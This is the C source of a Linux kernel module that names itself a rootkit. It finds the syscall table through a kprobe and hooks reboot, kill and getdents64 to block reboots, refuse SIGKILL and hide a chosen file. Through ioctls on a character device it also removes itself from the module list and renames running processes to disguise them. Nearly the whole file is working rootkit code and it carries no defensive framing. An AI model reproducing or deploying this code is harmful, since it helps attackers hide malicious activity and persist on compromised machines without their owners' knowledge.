#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/sched/signal.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/cdev.h>
#include <asm/syscall.h>
#include <linux/string.h>
#include <linux/kprobes.h>

#include "rootkit.h"

#define OURMODNAME "rootkit"

MODULE_AUTHOR("FOOBAR");
MODULE_DESCRIPTION("FOOBAR");
MODULE_LICENSE("Dual MIT/GPL");
MODULE_VERSION("0.1");

static int major;
struct cdev *kernel_cdev;
struct class *class;
struct device *device;
dev_t dev;
bool is_hidden;
struct list_head *prev;
unsigned long (*__kallsyms_lookup_name)(const char *);
syscall_fn_t *__sys_call_table;
syscall_fn_t __sys_reboot;
syscall_fn_t __sys_kill;
syscall_fn_t __sys_getdents64;
void (*__update_mapping_prot)(phys_addr_t, unsigned long, phys_addr_t, pgprot_t);
bool is_hooked;
struct hided_file file_to_hide;

static int rootkit_open(struct inode *inode, struct file *filp)
{
	printk(KERN_INFO "%s\n", __func__);
	return 0;
}

static int rootkit_release(struct inode *inode, struct file *filp)
{
	printk(KERN_INFO "%s\n", __func__);
	return 0;
}

//sys_reboot(int magic1, int magic2, unsigned int cmd, void __user *arg)
long my_reboot(const struct pt_regs *regs)
{
	pr_err("intercepting reboot...\n");	
	return 0;
}

//sys_kill(pid_t pid, int sig)
long my_kill(const struct pt_regs *regs)
{
	pr_err("intercepting kill...\n");	

	if (regs->regs[1] == SIGKILL) {
		pr_err("found SIGKILL, deny it\n");	
		return 0;
	}
	return (*__sys_kill)(regs);
}

//sys_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
long my_getdents64(const struct pt_regs *regs) {
	
	struct linux_dirent64 __user *user_dirents;
	struct linux_dirent64 *dirents, *curr;
	long bytes_read;
	long ret_bytes_read;
	long ret = 0;
	long offset = 0;

	pr_err("intercepting getdents64...\n");	

	user_dirents = (struct linux_dirent64 __user *)regs->regs[1];

	bytes_read = (*__sys_getdents64)(regs);
	if (bytes_read <= 0) {
		ret = bytes_read;
		goto err;
	}

	if (file_to_hide.len <= 0) {
		return bytes_read;
	}

	ret_bytes_read = bytes_read;
	dirents = kmalloc(bytes_read, GFP_KERNEL);
	if (dirents == NULL) {
		ret = -EFAULT;
		goto err;
	}
	if (copy_from_user(dirents, user_dirents, bytes_read)) {
		ret = -EFAULT;
		goto err_free;
	}

	while (offset < bytes_read) {
		curr = (struct linux_dirent64 *)((void *)dirents + offset);
		if (strncmp(file_to_hide.name, curr->d_name, file_to_hide.len) == 0) {
			ret_bytes_read -= curr->d_reclen;
			memmove(curr, (void *)curr + curr->d_reclen, ret_bytes_read);
			// XXX: we assume only one file to hide for now
			break;
		}
		offset += curr->d_reclen;
	}
	ret = ret_bytes_read;

	if (copy_to_user(user_dirents, dirents, ret_bytes_read)) {
		ret = -EFAULT;
	}

err_free:
	kfree(dirents);
err:
	return ret;
	
}

static void hook_syscalls(void)
{

	if (is_hooked)
		return;

	__sys_reboot = __sys_call_table[__NR_reboot];
	__sys_kill = __sys_call_table[__NR_kill];
	__sys_getdents64 = __sys_call_table[__NR_getdents64];

	(*__update_mapping_prot)(virt_to_phys((void *)__sys_call_table), (unsigned long)__sys_call_table,
						sizeof(syscall_fn_t) * __NR_syscalls, PAGE_KERNEL);

	__sys_call_table[__NR_reboot] = my_reboot;
	__sys_call_table[__NR_kill] = my_kill;
	__sys_call_table[__NR_getdents64] = my_getdents64;
	
	(*__update_mapping_prot)(virt_to_phys((void *)__sys_call_table), (unsigned long)__sys_call_table,
						sizeof(syscall_fn_t) * __NR_syscalls, PAGE_KERNEL_RO);

	is_hooked = true;
}

static void unhook_syscalls(void)
{
	if (!is_hooked)
		return;

	(*__update_mapping_prot)(virt_to_phys((void *)__sys_call_table), (unsigned long)__sys_call_table,
						sizeof(syscall_fn_t) * __NR_syscalls, PAGE_KERNEL);

	__sys_call_table[__NR_reboot] = __sys_reboot;
	__sys_call_table[__NR_kill] = __sys_kill;
	__sys_call_table[__NR_getdents64] = __sys_getdents64;
	
	(*__update_mapping_prot)(virt_to_phys((void *)__sys_call_table), (unsigned long)__sys_call_table,
						sizeof(syscall_fn_t) * __NR_syscalls, PAGE_KERNEL_RO);

	is_hooked = false;
}

static int sanitize_req(struct masq_proc_req *req)
{

	struct masq_proc *buf;
	int i;
	int len = 0;

	buf = (struct masq_proc *)kmalloc(sizeof(struct masq_proc) * req->len, GFP_KERNEL);
	if (buf == NULL) {
		return -EFAULT;
	}

	// remove entry with strlen(new_name) > strlen(orig_name)
	for (i = 0; i < req->len; i++) {
		if (strlen(req->list[i].new_name) > strlen(req->list[i].orig_name))
			continue;
		memcpy(&buf[len++], &req->list[i], sizeof(struct masq_proc));
	}
	memcpy(req->list, buf, sizeof(struct masq_proc) * len);
	req->len = len;

	kfree(buf);
	
	return 0;
}

static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
			  unsigned long arg)
{
	long ret = 0;
	void __user *argp = (void __user *)arg;

	printk(KERN_INFO "%s\n", __func__);

	switch(ioctl) {

	case IOCTL_MOD_HOOK: {

		if (is_hooked) {
			unhook_syscalls();
		} else {
			hook_syscalls();
		}
		break;
	}
	case IOCTL_MOD_HIDE: {

		if (is_hidden) {
			list_add(&THIS_MODULE->list, prev);
			is_hidden = false;
		} else {
			list_del_init(&THIS_MODULE->list);
			is_hidden = true;
		}
		break;
	}
	case IOCTL_MOD_MASQ: {

		struct masq_proc_req __user *user_req = argp;
		struct masq_proc_req req;
		struct masq_proc __user *user_list;
		struct task_struct *task;
		size_t i, list_size;

		if (copy_from_user(&req, user_req, sizeof(struct masq_proc_req))) {
			ret = -EFAULT;
			break;
		}
		user_list = (struct masq_proc __user *)req.list;
		if (req.len < 0) {
			ret = -EINVAL;
			break;
		}
		list_size = sizeof(struct masq_proc) * req.len;
		req.list = (struct masq_proc *)kmalloc(list_size, GFP_KERNEL);
		if (req.list == NULL) {
			ret = -EFAULT;
			break;
		}
		if (copy_from_user(req.list, user_list, list_size)) {
			ret = -EFAULT;
			goto err_free;
		}
		
		// remove entry with strlen(new_name) > strlen(orig_name)
		ret = sanitize_req(&req);
		if (ret) {
			goto err_free;
		}

		pr_err("after sanitization:\n");
		for (i = 0; i < req.len; i++) {
			pr_err("%zu:\n", i);
			pr_err("\t%s\n", req.list[i].orig_name);
			pr_err("\t%s\n", req.list[i].new_name);
		}

		for_each_process(task) {
			for (i = 0; i < req.len; i++)
				if (strncmp(req.list[i].orig_name, task->comm, sizeof(task->comm)) == 0) {
					// set_task_comm(task, req.list[i].new_name);
					// XXX: this correct?
					task_lock(task);
					strlcpy(task->comm, req.list[i].new_name, sizeof(task->comm));
					task_unlock(task);
				}
		}
err_free:
		kfree(req.list);
		break;
	}
	case IOCTL_FILE_HIDE: {

		struct hided_file __user *user_hided_file = argp;
		// XXX: should we make sure the HOOK ioctl is called before?
		// XXX: only one file at a time?
		if (!is_hooked) {
			ret = -EINVAL;
			break;
		}

		if (copy_from_user(&file_to_hide, user_hided_file, sizeof(struct hided_file))) {
			ret = -EFAULT;
			break;
		}
		
		if (file_to_hide.len < 0 || file_to_hide.len >= NAME_LEN) {
			ret = -EINVAL;
			break;
		}
		// NULL-terminate the given string
		file_to_hide.name[file_to_hide.len] = '\0';
		break;
	}

	default:
		ret = -EINVAL;
	}
	return ret;
}

struct file_operations fops = {
	open: rootkit_open,
	unlocked_ioctl: rootkit_ioctl,
	release: rootkit_release,
	owner: THIS_MODULE
};

static inline int get_kallsyms_lookup_name(void)
{
	struct kprobe kp = {
		.symbol_name = "kallsyms_lookup_name",
	};

	if (register_kprobe(&kp))
		return -1;

	__kallsyms_lookup_name = (unsigned long (*)(const char *))kp.addr;
	unregister_kprobe(&kp);

	return 0;
}

static int __init rootkit_init(void)
{
	int ret;
	dev_t dev_no;

	kernel_cdev = cdev_alloc();
	kernel_cdev->ops = &fops;
	kernel_cdev->owner = THIS_MODULE;

	ret = alloc_chrdev_region(&dev_no, 0, 1, "rootkit");
	if (ret < 0) {
		pr_info("major number allocation failed\n");
		goto err;
	}

	major = MAJOR(dev_no);
	dev = MKDEV(major, 0);
	printk("The major number for your device is %d\n", major);
	ret = cdev_add(kernel_cdev, dev, 1);
	if (ret < 0) {
		pr_info(KERN_INFO "unable to allocate cdev");
		goto err_cdev;
	}

	// create /dev node automatically
	class = class_create(THIS_MODULE, OURMODNAME);
	if (IS_ERR(class)) {
		pr_err("class_create() failed\n");
		ret = PTR_ERR(class);
		goto err_class;
	}
	device = device_create(class, NULL, dev, NULL, OURMODNAME);
	if (IS_ERR(device)) {
		pr_err("device_create() failed\n");
		ret = PTR_ERR(device);
		goto err_device;
	}

	// for hiding module
	is_hidden = false;
	prev = THIS_MODULE->list.prev;

	is_hooked = false;

	file_to_hide.len = -1;
	file_to_hide.name[0] = '\0';

	// getting useful symbols
	if (get_kallsyms_lookup_name() < 0) {
		pr_err("get kallsyms_lookup_name failed\n");
		ret = -EFAULT;
		goto err_last;
	}
	__sys_call_table = (syscall_fn_t *)(*__kallsyms_lookup_name)("sys_call_table");
	if (__sys_call_table == 0) {
		pr_err("get sys_call_table failed\n");
		ret = -EFAULT;
		goto err_last;
	}
    __update_mapping_prot = (void (*)(phys_addr_t, unsigned long, phys_addr_t, pgprot_t))
							(*__kallsyms_lookup_name)("update_mapping_prot");
	//pr_err("kallsyms_lookup_name: %#010lx\n", (unsigned long)__kallsyms_lookup_name);
	//pr_err("sys_call_table: %#010lx\n", (unsigned long)__sys_call_table);

	return 0;

err_last:
	device_destroy(class, dev);
err_device:
	class_destroy(class);
err_class:
	cdev_del(kernel_cdev);
err_cdev:
	unregister_chrdev_region(dev, 1);
err:
	return ret;

}

static void __exit rootkit_exit(void)
{
	// TODO: unhook syscall
	if (is_hooked)
		unhook_syscalls();

	pr_info("%s: removed\n", OURMODNAME);
	cdev_del(kernel_cdev);
	// XXX: this should be major or dev?
	unregister_chrdev_region(dev, 1);

	device_destroy(class, dev);

	class_destroy(class);

}

module_init(rootkit_init);
module_exit(rootkit_exit);
